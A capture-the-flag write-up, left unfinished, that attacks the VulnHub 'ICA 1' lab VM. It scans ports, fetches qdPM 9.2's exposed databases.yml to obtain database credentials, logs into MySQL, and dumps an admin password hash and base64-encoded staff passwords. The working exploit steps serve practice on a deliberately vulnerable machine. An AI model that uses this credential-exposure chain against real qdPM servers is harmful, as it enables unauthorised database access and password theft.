# ICA 1

Download VM from:

[https://www.vulnhub.com/entry/ica-1,748/](https://www.vulnhub.com/entry/ica-1,748/)


Run VM:

![](IMG/ICA1VM.png)

Simple NMAP scan:

```shell
sudo nmap -sS 192.168.1.179
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-31 19:41 CEST
Nmap scan report for debian.home (192.168.1.179)
Host is up (0.00024s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 08:00:27:9D:A7:AA (Oracle VirtualBox virtual NIC)
```

Open broswer:

![](IMG/qdpm92.png)

Search vuln for qdpm92:

```shell
└─$ searchsploit qdpm 9.2          
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
qdPM 9.2 - Cross-site Request Forgery (CSRF)                                                                                                                                                              | php/webapps/50854.txt
qdPM 9.2 - Password Exposure (Unauthenticated)                                                                                                                                                            | php/webapps/50176.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                                                                            
└─$ 
```

```shell
└─$ searchsploit -p php/webapps/50176.txt
  Exploit: qdPM 9.2 - Password Exposure (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/50176
     Path: /usr/share/exploitdb/exploits/php/webapps/50176.txt
File Type: ASCII text
```
                                                                                                                                                                                                                                            
```shell
└─$ cat /usr/share/exploitdb/exploits/php/webapps/50176.txt
# Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)
# Date: 03/08/2021
# Exploit Author: Leon Trappett (thepcn3rd)
# Vendor Homepage: https://qdpm.net/
# Software Link: https://sourceforge.net/projects/qdpm/files/latest/download
# Version: 9.2
# Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4

The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://<website>/core/config/databases.yml file and download.                                                                                                                                                                                                                                            
└─$ 

```

Get databases.yml credentials file:

```shell
└─$ curl http://192.168.1.179/core/config/databases.yml
  
all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qdpm;host=192.168.1.179'
      profiler: false
      username: qdpmadmin
      password: "<?php echo urlencode('UcVQCMQk2STVeS6J') ; ?>"
      attributes:
        quote_identifier: true  
                                                                                                                                                                                                                                            
└─$ 
```

Connect to mysql:

```shell
└─$ mysql -h 192.168.1.179 -u qdpmadmin -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 8.0.26 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

Show databases:

```shell
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| qdpm               |
| staff              |
| sys                |
+--------------------+
6 rows in set (0.175 sec)

MySQL [(none)]> 

```

Connect to qdpm database and show tables:
```shell
MySQL [qdpm]> show tables;
+----------------------+
| Tables_in_qdpm       |
+----------------------+
| attachments          |
| configuration        |
| departments          |
| discussions          |
| discussions_comments |
| discussions_reports  |
| discussions_status   |
| events               |
| extra_fields         |
| extra_fields_list    |
| phases               |
| phases_status        |
| projects             |
| projects_comments    |
| projects_phases      |
| projects_reports     |
| projects_status      |
| projects_types       |
| tasks                |
| tasks_comments       |
| tasks_groups         |
| tasks_labels         |
| tasks_priority       |
| tasks_status         |
| tasks_types          |
| tickets              |
| tickets_comments     |
| tickets_reports      |
| tickets_status       |
| tickets_types        |
| user_reports         |
| users                |
| users_groups         |
| versions             |
| versions_status      |
+----------------------+
35 rows in set (0.002 sec)

MySQL [qdpm]> 
```

Check relevant information on configuration table:

```shell
MySQL [qdpm]> select * from configuration order by id asc Limit 5;
+----+----------------------------+------------------------------------+
| id | key                        | value                              |
+----+----------------------------+------------------------------------+
|  1 | app_administrator_email    | admin@localhost.com                |
|  2 | app_administrator_password | $P$EmesnWRcY9GrK0hDzwaV3rvQnMJ/Fx0 |
|  3 | app_app_name               | Workspace                          |
|  4 | app_app_short_name         | qdPM                               |
|  5 | app_email_label            | qdPM -                             |
+----+----------------------------+------------------------------------+
5 rows in set (0.000 sec)

MySQL [qdpm]> 
```

Identify password hash:
```shell
└─$ hash-identifier                                   
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $P$EmesnWRcY9GrK0hDzwaV3rvQnMJ/Fx0

Possible Hashs:
[+] MD5(Wordpress)
--------------------------------------------------
 HASH: 
```

>PENDING HASHCAT DICT 

Lets check staff database information:

```shell

MySQL [qdpm]> connect staff;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Connection id:    145
Current database: staff

MySQL [staff]> show tables;
+-----------------+
| Tables_in_staff |
+-----------------+
| department      |
| login           |
| user            |
+-----------------+
3 rows in set (0.002 sec)

MySQL [staff]> 

MySQL [staff]> select * from user;
+------+---------------+--------+---------------------------+
| id   | department_id | name   | role                      |
+------+---------------+--------+---------------------------+
|    1 |             1 | Smith  | Cyber Security Specialist |
|    2 |             2 | Lucas  | Computer Engineer         |
|    3 |             1 | Travis | Intelligence Specialist   |
|    4 |             1 | Dexter | Cyber Security Analyst    |
|    5 |             2 | Meyer  | Genetic Engineer          |
+------+---------------+--------+---------------------------+
5 rows in set (0.001 sec)

MySQL [staff]> select * from login;
+------+---------+--------------------------+
| id   | user_id | password                 |
+------+---------+--------------------------+
|    1 |       2 | c3VSSkFkR3dMcDhkeTNyRg== |
|    2 |       4 | N1p3VjRxdGc0MmNtVVhHWA== |
|    3 |       1 | WDdNUWtQM1cyOWZld0hkQw== |
|    4 |       3 | REpjZVZ5OThXMjhZN3dMZw== |
|    5 |       5 | Y3FObkJXQ0J5UzJEdUpTeQ== |
+------+---------+--------------------------+
5 rows in set (0.001 sec)

MySQL [staff]> 


```

>TO BE CONTINUED

echo -ne 'c3VSSkFkR3dMcDhkeTNyRg==' | base64 -d -